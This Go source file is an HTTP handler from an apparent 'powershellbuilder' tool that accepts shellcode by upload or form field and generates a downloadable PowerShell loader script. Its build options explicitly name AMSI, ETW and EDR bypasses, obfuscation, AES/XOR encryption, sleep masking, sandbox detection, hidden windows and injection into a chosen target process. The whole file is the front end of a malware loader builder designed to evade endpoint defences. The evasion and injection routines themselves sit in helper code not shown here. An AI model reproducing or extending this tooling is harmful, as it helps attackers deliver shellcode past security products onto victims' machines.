package handlers

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"powershellbuilder/models"
	"powershellbuilder/utils"
	"strconv"
	"time"
)

func BuildHandler(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(10 << 20); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	rawShellcode := r.FormValue("rawShellcode")

	var shellcodeData []byte
	file, _, err := r.FormFile("binFile")
	if err == nil && file != nil {
		defer file.Close()
		shellcodeData, err = io.ReadAll(file)
		if err != nil {
			http.Error(w, "Failed to read uploaded file", http.StatusInternalServerError)
			return
		}
	}

	var finalShellcode string
	if rawShellcode != "" {
		finalShellcode = base64.StdEncoding.EncodeToString([]byte(rawShellcode))
	} else if len(shellcodeData) > 0 {
		finalShellcode = base64.StdEncoding.EncodeToString(shellcodeData)
	} else {
		http.Error(w, "No shellcode provided", http.StatusBadRequest)
		return
	}

	encryptionMethod := r.FormValue("encryptionMethod")
	isEncrypted := encryptionMethod != "" && encryptionMethod != "None"

	executionDelay := 0
	if r.FormValue("executionDelay") != "" {
		if r.FormValue("executionDelay") == "random" {
			executionDelay = -1
		} else {
			executionDelay, _ = strconv.Atoi(r.FormValue("executionDelay"))
		}
	}

	opts := models.BuildOptions{
		Shellcode:        finalShellcode,
		Encrypt:          isEncrypted,
		AESKey:           r.FormValue("aeskey"),
		XORKey:           r.FormValue("xorkey"),
		EncryptType:      encryptionMethod,
		Obfuscate:        r.FormValue("obfuscate") == "on",
		ObfuscationLevel: r.FormValue("obfuscationLevel"),
		AMSIBypass:       r.FormValue("amsi") == "on",
		AMSIBypassType:   r.FormValue("amsiBypassType"),
		ETWBypass:        r.FormValue("etw") == "on",
		ETWBypassType:    r.FormValue("etwBypassType"),
		EDRBypassType:    r.FormValue("edr"),
		SleepMasking:     r.FormValue("sleep") == "on",
		ExecutionDelay:   executionDelay,
		HideWindow:       r.FormValue("hideWindow") == "on",
		TelemetryNoise:   r.FormValue("noise") == "on",
		SandboxDetection: r.FormValue("sandboxDetection") == "on",
		InjectionMethod:  r.FormValue("injectmethod"),
		TargetProc:       r.FormValue("targetproc"),
		CleanupMethod:    r.FormValue("cleanupMethod"),
	}

	fmt.Printf("DEBUG HANDLER: Encrypt=%v, EncryptType=%s, AMSI=%s, ETW=%s, Obfuscation=%s\n",
		opts.Encrypt, opts.EncryptType, opts.AMSIBypassType, opts.ETWBypassType, opts.ObfuscationLevel)

	psScript, err := utils.GeneratePowerShell(opts)
	if err != nil {
		http.Error(w, "Failed to generate loader: "+err.Error(), http.StatusInternalServerError)
		return
	}

	outputDir := "output"
	timestamp := time.Now().Unix()
	os.MkdirAll(outputDir, 0755)
	filename := fmt.Sprintf("loader_%d.ps1", timestamp)
	outputPath := filepath.Join(outputDir, filename)
	err = os.WriteFile(outputPath, []byte(psScript), 0644)
	if err != nil {
		http.Error(w, "Failed to write file", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write([]byte(psScript))
}
